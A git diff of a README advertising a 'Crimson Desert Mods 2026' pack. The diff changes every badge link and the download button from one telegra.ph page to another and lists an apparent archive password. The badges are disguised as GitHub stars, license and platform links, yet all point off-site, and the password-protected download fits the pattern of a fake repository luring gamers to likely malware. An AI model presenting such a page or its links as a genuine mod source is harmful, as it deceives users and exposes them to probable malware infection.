@@ -1,14 +1,14 @@
 # 🎮 Crimson Desert Mods 2026 — Best Mods Collection & Ultimate Pack
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Crimson-Desert)](https://telegra.ph/Download-05-21-39)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://telegra.ph/Download-05-21-39)
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://telegra.ph/Download-05-21-39)
-[![Category](https://img.shields.io/badge/Category-Modding-orange)](https://telegra.ph/Download-05-21-39)
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://telegra.ph/Download-05-21-39)
+[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Crimson-Desert)](https://telegra.ph/Latest-06-01-4)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://telegra.ph/Latest-06-01-4)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://telegra.ph/Latest-06-01-4)
+[![Category](https://img.shields.io/badge/Category-Modding-orange)](https://telegra.ph/Latest-06-01-4)
+[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://telegra.ph/Latest-06-01-4)
 
 ---
 
-[![Download](og-image.png)](https://telegra.ph/Download-05-21-39)
+[![Download](og-image.png)](https://telegra.ph/Latest-06-01-4)
 
 <img src="https://cdn.akamai.steamstatic.com/steam/apps/2445070/header.jpg" alt="banner" width="100%" />
 
@@ -23,7 +23,7 @@
 
 ## 📥 Download
 
-[![Crimson Desert Mods](https://img.shields.io/badge/Download%20Crimson%20Desert%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://telegra.ph/Download-05-21-39)
+[![Crimson Desert Mods](https://img.shields.io/badge/Download%20Crimson%20Desert%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://telegra.ph/Latest-06-01-4)
 
 **🔐🔐🔐** `1847`
 
